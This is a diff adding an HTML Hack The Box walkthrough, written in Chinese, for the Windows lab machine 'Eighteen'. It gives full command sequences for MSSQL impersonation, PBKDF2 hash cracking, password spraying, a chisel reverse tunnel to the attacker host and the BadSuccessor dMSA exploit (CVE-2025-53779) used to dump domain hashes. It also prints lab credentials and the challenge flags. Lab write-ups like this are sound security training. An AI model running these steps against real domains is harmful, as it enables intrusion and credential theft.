@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Eighteen — Nauhcnes</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--phase-recon:#60a5fa;--phase-foothold:#4ade80;--phase-lateral:#a78bfa;--phase-privesc:#f87171;--medium:#fbbf24;--linux:#60a5fa;--windows:#60a5fa}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+code,pre{font-family:'IBM Plex Mono',monospace}
+code{background:var(--surface-raised);padding:0.15em 0.4em;border-radius:3px;font-size:0.88em}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;font-size:0.82rem;line-height:1.6;margin:1rem 0}
+.header{border-bottom:1px solid var(--border);padding:2.5rem 2rem 2rem;position:relative}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--medium)}
+.header-inner{max-width:820px;margin:0 auto}
+.back{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted);text-decoration:none;display:inline-block;margin-bottom:1rem}
+.back:hover{color:var(--accent)}
+.header h1{font-size:2rem;font-weight:700;color:var(--heading);letter-spacing:-0.02em}
+.header-meta{margin-top:0.6rem;font-family:'IBM Plex Mono',monospace;font-size:0.78rem;color:var(--text-muted);display:flex;gap:1.2rem;flex-wrap:wrap}
+.tag{padding:0.15rem 0.5rem;border-radius:3px;background:var(--surface-raised)}
+.tag-medium{color:var(--medium)}
+.tag-windows{color:#60a5fa}
+main{max-width:820px;margin:0 auto;padding:1.5rem 2rem 4rem}
+h2{font-size:1.3rem;font-weight:700;color:var(--heading);margin:2.5rem 0 1rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border)}
+h3{font-size:1.05rem;font-weight:600;color:var(--heading);margin:1.8rem 0 0.8rem}
+p{margin:0.6rem 0}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem}
+th,td{border:1px solid var(--border);padding:0.5rem 0.8rem;text-align:left}
+th{background:var(--surface);color:var(--heading);font-weight:600}
+td{background:var(--surface)}
+.callout{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.2rem;margin:1rem 0;font-size:0.9rem}
+.callout-warn{border-left-color:var(--medium)}
+.phase{font-family:'IBM Plex Mono',monospace;font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.2rem 0.6rem;border-radius:3px;display:inline-block;margin-bottom:0.4rem}
+.phase-recon{background:#1e3a5f40;color:var(--phase-recon)}
+.phase-foothold{background:#16653420;color:var(--phase-foothold)}
+.phase-lateral{background:#4c1d9520;color:var(--phase-lateral)}
+.phase-privesc{background:#991b1b20;color:var(--phase-privesc)}
+.diagram{display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap;padding:1.2rem;background:var(--surface);border:1px solid var(--border);border-radius:6px;margin:1.5rem 0;font-family:'IBM Plex Mono',monospace;font-size:0.78rem}
+.node{padding:0.3rem 0.7rem;border-radius:4px;white-space:nowrap}
+.node-green{background:#16653430;color:var(--phase-foothold);border:1px solid #16653460}
+.node-purple{background:#4c1d9530;color:var(--phase-lateral);border:1px solid #4c1d9560}
+.node-red{background:#991b1b30;color:var(--phase-privesc);border:1px solid #991b1b60}
+.arrow{color:var(--text-muted)}
+.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;color:var(--text-muted);border-top:1px solid var(--border)}
+.gate{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:1rem}
+.gate input{background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:0.6rem 1rem;border-radius:4px;font-family:'IBM Plex Mono',monospace;font-size:0.9rem;text-align:center;outline:none;width:220px}
+.gate input:focus{border-color:var(--accent)}
+.gate label{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted)}
+.gate .err{color:var(--phase-privesc);font-size:0.75rem;font-family:'IBM Plex Mono',monospace;height:1rem}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+<label>输入机器名称解锁</label>
+<input type="password" id="gate-pw" placeholder="machine name" autofocus>
+<div class="err" id="gate-err"></div>
+</div>
+<script>
+document.getElementById('gate-pw').addEventListener('keydown',function(e){
+if(e.key==='Enter'){
+if(this.value.toLowerCase()==='eighteen'){document.getElementById('gate').style.display='none'}
+else{document.getElementById('gate-err').textContent='wrong password'}
+}});
+</script>
+
+<div class="header">
+<div class="header-inner">
+<a class="back" href="../">← 返回目录</a>
+<h1>Eighteen</h1>
+<div class="header-meta">
+<span class="tag tag-medium">Medium</span>
+<span class="tag tag-windows">Windows</span>
+<span>10.129.58.99</span>
+<span>DC01.eighteen.htb</span>
+</div>
+</div>
+</div>
+
+<main>
+
+<div class="diagram"><span class="node node-green">MSSQL IMPERSONATE → appdev</span><span class="arrow">→</span><span class="node node-green">PBKDF2 破解 admin 密码</span><span class="arrow">→</span><span class="node node-purple">RID 枚举 + 密码喷洒 → adam.scott WinRM</span><span class="arrow">→</span><span class="node node-red">CVE-2025-53779 dMSA Bad Successor → Domain Admin</span></div>
+
+<h2><span class="phase phase-recon">信息收集</span> Nmap 扫描</h2>
+
+<pre>sudo nmap -sCV -p- -T4 10.129.58.99</pre>
+
+<pre>PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (WinRM)</pre>
+
+<p>IIS(80) + MSSQL(1433) + WinRM(5985)。域名 <code>eighteen.htb</code>，计算机名 <code>DC01</code>。</p>
+
+<p>注册 Web 账号后获取凭据 <code>kevin</code> / <code>iNa2we6haRj2gaw!</code>。</p>
+
+<h2><span class="phase phase-foothold">立足点</span> MSSQL IMPERSONATE → PBKDF2 破解 → 密码喷洒</h2>
+
+<h3>MSSQL 登录与权限枚举</h3>
+<pre>nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth
+# [+] DC01\kevin:iNa2we6haRj2gaw!
+
+mssqlclient.py kevin:'iNa2we6haRj2gaw!'@eighteen.htb</pre>
+
+<pre>SQL&gt; enum_impersonate
+execute as   permission_name   grantee   grantor
+----------   ---------------   -------   -------
+LOGIN        IMPERSONATE       kevin     appdev</pre>
+
+<p>kevin 可以模拟 appdev 登录。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：MSSQL 的 IMPERSONATE 权限就像"代理权"——kevin 被允许"假装自己是 appdev"去执行操作。就像公司里 kevin 有一张授权书，上面写着"kevin 可以代表 appdev 签字"。</div>
+
+<h3>切换到 appdev 并访问数据库</h3>
+<pre>SQL&gt; exec_as_login appdev
+SQL&gt; use financial_planner
+SQL&gt; select * from users;</pre>
+
+<pre>id    username   password_hash                                                    is_admin
+----  --------   -------------------------------------------------------------    --------
+1002  admin      pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb...887133   1</pre>
+
+<h3>破解 PBKDF2-SHA256 哈希</h3>
+<p>PBKDF2 哈希需要转换格式才能给 hashcat 使用：</p>
+
+<pre># x.py — 格式转换脚本
+import base64
+hash = 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
+salt = hash.split('$')[1]
+key = hash.split('$')[2]
+print(f'{":".join(hash.split("$")[0].split(":")[1:])}:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(bytes.fromhex(key)).decode()}')</pre>
+
+<pre>python3 x.py &gt; hash
+# sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
+
+hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt</pre>
+
+<pre>sha256:600000:...:iloveyou1</pre>
+
+<p>管理员密码：<strong>iloveyou1</strong></p>
+
+<h3>RID 枚举 + 密码喷洒</h3>
+<pre>nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute</pre>
+
+<pre>1606: EIGHTEEN\jamie.dunn
+1607: EIGHTEEN\jane.smith
+1608: EIGHTEEN\alice.jones
+1609: EIGHTEEN\adam.scott
+1610: EIGHTEEN\bob.brown
+1611: EIGHTEEN\carol.white
+1612: EIGHTEEN\dave.green</pre>
+
+<pre>nxc winrm dc01.eighteen.htb -u ./users -p 'iloveyou1' --continue-on-success</pre>
+
+<pre>[+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)</pre>
+
+<h3>WinRM 登录</h3>
+<pre>evil-winrm -i dc01.eighteen.htb -u adam.scott -p 'iloveyou1'</pre>
+
+<pre>*Evil-WinRM* PS &gt; cat C:\Users\adam.scott\Desktop\user.txt
+ed28401786a31c6454c3b48c19b7a902</pre>
+
+<h2><span class="phase phase-privesc">权限提升</span> CVE-2025-53779 Bad Successor（dMSA 迁移伪造）</h2>
+
+<h3>漏洞背景</h3>
+<p><strong>dMSA（Delegated Managed Service Account）</strong> 是 Windows Server 2025 新引入的服务账户类型，支持"迁移"功能——新 dMSA 可以声明自己是某个旧账户的"接班人"，自动继承旧账户的所有权限。</p>
+
+<p>迁移关系通过 AD 属性 <code>msDS-ManagedAccountPrecededByLink</code> 记录。KDC 在签发 TGT 时检查该属性，如果存在则将旧账户的权限附加到新 dMSA 的票据中。</p>
+
+<p><strong>CVE-2025-53779（Bad Successor）的核心问题</strong>：KDC <strong>从不验证</strong>迁移是否经过授权。只要你能创建 dMSA 对象并设置该属性指向目标账户，KDC 就会无条件信任。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：Windows Server 2025 有一个"服务账号交接"功能。新账号在档案上写"我的前任是 Administrator"，保安队长（KDC）不核实就直接发了一把和 Administrator 一样的万能钥匙。攻击者只要能招一个"假接班人"，就能骗到域管权限。</div>
+
+<h3>利用条件</h3>
+<p>通过 BloodHound 分析，<code>adam.scott</code> 所在的 IT 组对 <code>OU=Staff</code> 有 <strong>CreateChild</strong> 权限——可以在该 OU 中创建新的 AD 对象（包括 dMSA）。</p>
+
+<h3>步骤一：建立 SOCKS 隧道</h3>
+
+<p><strong>攻击机：</strong></p>
+<pre>chisel server -p 8000 --reverse</pre>
+
+<p><strong>目标机：</strong></p>
+<pre>upload chisel_1.10.1_windows_amd64
+mv chisel_1.10.1_windows_amd64 c.exe
+./c.exe client 10.10.15.65:8000 R:socks</pre>
+
+<h3>步骤二：同步时间</h3>
+<p>Kerberos 要求客户端和 KDC 时间差不超过 5 分钟：</p>
+
+<pre># 目标机
+Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+
+# 攻击机
+sudo date -u -s "目标机时间"</pre>
+
+<h3>步骤三：安装带 Bad Successor 模块的 NetExec</h3>
+<pre>git clone https://github.com/azoxlpf/NetExec.git
+cd NetExec
+git checkout feat/refactor-badsuccessor
+pip install . --break-system-packages</pre>
+
+<h3>步骤四：创建恶意 dMSA</h3>
+<pre>proxychains -q netexec ldap dc01.eighteen.htb \
+  -u adam.scott -p 'iloveyou1' \
+  -M badsuccessor \
+  -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' \
+     DMSA_NAME=pwned \
+     TARGET_ACCOUNT=Administrator</pre>
+
+<p>这条命令做了三件事：</p>
+
+<table>
+<tr><th>操作</th><th>含义</th></tr>
+<tr><td><code>DMSA_NAME=pwned</code></td><td>在 Staff OU 中创建名为 <code>pwned</code> 的 dMSA</td></tr>
+<tr><td><code>TARGET_ACCOUNT=Administrator</code></td><td>设置 <code>msDS-ManagedAccountPrecededByLink</code> 指向 Administrator</td></tr>
+<tr><td><code>msDS-DelegatedMSAState=2</code></td><td>标记迁移状态为"已完成"</td></tr>
+</table>
+
+<p>命令成功后生成 <code>pwned$.ccache</code> 票据文件——这张票据包含了 Administrator 的权限。</p>
+
+<h3>步骤五：使用票据 dump 域哈希</h3>
+<pre>KRB5CCNAME=pwned\$.ccache proxychains -q netexec smb dc01.eighteen.htb --use-kcache --ntds</pre>
+
+<h3>步骤六：Pass-the-Hash 获取域管</h3>
+<pre>evil-winrm -i dc01.eighteen.htb -u administrator -H 0b133be956bfaddf9cea56701affddec</pre>
+
+<pre>*Evil-WinRM* PS &gt; cat C:\Users\Administrator\Desktop\root.txt
+5b93785347821392a7a933cf69c5d538</pre>
+
+<div class="callout callout-warn">
+<p><strong>⚠️ 踩坑提醒</strong></p>
+<p>PBKDF2 哈希需要格式转换（salt 和 key 都要 Base64 编码）才能给 hashcat <code>-m 10900</code> 使用</p>
+<p>chisel 隧道是必需的——badsuccessor 模块需要从攻击机直接访问 LDAP</p>
+<p>时间同步至关重要——Kerberos 票据签发对时间偏差非常敏感</p>
+<p>需要使用特定分支的 NetExec（<code>feat/refactor-badsuccessor</code>），主线版本暂不支持</p>
+<p>Windows Server 2025 的域功能级别是 <code>Windows2025Domain</code>，这是 dMSA 功能的前提条件</p>
+</div>
+
+<h2>知识点速查表</h2>
+
+<table>
+<tr><th>阶段</th><th>技术</th><th>工具</th><th>助记词</th></tr>
+<tr><td>信息收集</td><td>MSSQL 登录 + IMPERSONATE 枚举</td><td>mssqlclient.py</td><td>🔍 "SQL 查代理权"</td></tr>
+<tr><td>立足点</td><td>IMPERSONATE 切换用户 + 读数据库</td><td>exec_as_login</td><td>🎭 "借身份查库"</td></tr>
+<tr><td>密码破解</td><td>PBKDF2-SHA256 格式转换 + 破解</td><td>hashcat -m 10900</td><td>🔨 "转格式砸哈希"</td></tr>
+<tr><td>横向移动</td><td>RID 枚举 + 密码喷洒</td><td>nxc --rid-brute + winrm 喷洒</td><td>🌧️ "喷密码找复用"</td></tr>
+<tr><td>权限提升</td><td>dMSA Bad Successor 伪造迁移</td><td>CVE-2025-53779 / netexec badsuccessor</td><td>🏴 "假接班人骗钥匙"</td></tr>
+</table>
+
+<h2>额外知识</h2>
+
+<h3>dMSA 与 gMSA 的区别</h3>
+<table>
+<tr><th>特性</th><th>gMSA</th><th>dMSA（Windows Server 2025 新增）</th></tr>
+<tr><td>密码管理</td><td>系统自动轮换 120 字符随机密码</td><td>同上</td></tr>
+<tr><td>迁移功能</td><td>❌ 无</td><td>✅ 可声明"前任账户"继承权限</td></tr>
+<tr><td>安全风险</td><td>低（需要特定主机组才能获取密码）</td><td><strong>高</strong>（迁移链接不验证授权）</td></tr>
+</table>
+
+<h3>MSSQL IMPERSONATE 攻击路径</h3>
+<p>MSSQL 中 <code>IMPERSONATE</code> 权限允许一个登录账户模拟另一个账户的身份执行操作。常见攻击链：低权限用户 → IMPERSONATE 高权限用户 → 访问受限数据库 / 启用 xp_cmdshell / 执行系统命令。</p>
+<p>枚举命令：<code>enum_impersonate</code>（impacket-mssqlclient）或 <code>SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'</code>。</p>
+
+<h3>Bad Successor 防御</h3>
+<p>微软已在 2025 年 7 月补丁中修复此漏洞。防御措施包括：安装最新安全更新；监控 dMSA 对象的创建（事件 ID 5136/5137）；限制 CreateChild 权限的授予范围；审计 <code>msDS-ManagedAccountPrecededByLink</code> 属性的修改。</p>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Eighteen 攻略 · 2026</footer>
+</body></html>
